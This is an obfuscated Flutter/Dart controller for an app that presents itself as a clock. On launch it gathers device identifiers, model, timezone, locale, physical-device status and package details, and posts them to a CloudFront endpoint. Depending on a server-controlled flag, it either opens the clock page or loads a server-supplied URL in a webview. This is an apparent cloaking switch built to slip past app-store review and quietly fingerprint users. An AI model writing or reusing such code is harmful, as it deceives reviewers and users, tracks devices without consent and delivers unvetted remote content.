import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class HomeLedgerTranslateLogic extends GetxController {

  var asfhbpn = RxBool(false);
  var xeiors = RxBool(true);
  var ohpmis = RxString("");
  var ureyjw = RxBool(false);
  var snwz = RxBool(true);
  final bcwxlrgso = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    oknbgfd();
  }


  Future<void> oknbgfd() async {
    ureyjw.value = true;
    snwz.value = true;
    xeiors.value = false;

    bcwxlrgso.post("https://d27ljbcxye1r3v.cloudfront.net/omewcnfubptvsgyd?no_check",data: await eshaln()).then((value) {
      var tfemrj = value.data["tfemrj"] as String;
      var sifabrw = value.data["sifabrw"] as bool;
      if (sifabrw) {
        ohpmis.value = tfemrj;
        tkasog();
      } else {
        fwkmah();
      }
    }).catchError((e) {
      xeiors.value = true;
      snwz.value = true;
      ureyjw.value = false;
    });
  }

  Future<Map<String, dynamic>> eshaln() async {
    final DeviceInfoPlugin jwrnozs = DeviceInfoPlugin();
    PackageInfo pcvhaxwe_dhezij = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var txrikew = Platform.localeName;
    var phl_LgHjM = currentTimeZone;

    var phl_vE = pcvhaxwe_dhezij.packageName;
    var phl_nq = pcvhaxwe_dhezij.version;
    var phl_QkmsY = pcvhaxwe_dhezij.buildNumber;

    var phl_PR = pcvhaxwe_dhezij.appName;
    var phl_toFhrVHp = "";
    var phl_AZyglQ  = "";
    var phl_das = "";
    var stqlofv = "";
    var vedpk = "";
    var idxqyvpt = "";
    var jzyrwx = "";
    var moehzdw = "";
    var wjuzosev = "";


    var phl_trDgBy = "";
    var phl_oCj = false;

    if (GetPlatform.isAndroid) {
      phl_trDgBy = "android";
      var kpsadhvwxi = await jwrnozs.androidInfo;

      phl_das = kpsadhvwxi.brand;

      phl_toFhrVHp  = kpsadhvwxi.model;
      phl_AZyglQ = kpsadhvwxi.id;

      phl_oCj = kpsadhvwxi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      phl_trDgBy = "ios";
      var dotiugfzp = await jwrnozs.iosInfo;
      phl_das = dotiugfzp.name;
      phl_toFhrVHp = dotiugfzp.model;

      phl_AZyglQ = dotiugfzp.identifierForVendor ?? "";
      phl_oCj  = dotiugfzp.isPhysicalDevice;
    }

    var res = {
      "phl_PR": phl_PR,
      "phl_QkmsY": phl_QkmsY,
      "jzyrwx" : jzyrwx,
      "phl_vE": phl_vE,
      "phl_LgHjM": phl_LgHjM,
      "idxqyvpt" : idxqyvpt,
      "phl_das": phl_das,
      "phl_AZyglQ": phl_AZyglQ,
      "txrikew": txrikew,
      "phl_toFhrVHp": phl_toFhrVHp,
      "phl_trDgBy": phl_trDgBy,
      "phl_nq": phl_nq,
      "phl_oCj": phl_oCj,
      "stqlofv" : stqlofv,
      "vedpk" : vedpk,
      "moehzdw" : moehzdw,
      "wjuzosev" : wjuzosev,

    };
    return res;
  }

  Future<void> fwkmah() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> tkasog() async {
    Get.offNamed("/Outreload");
  }

}
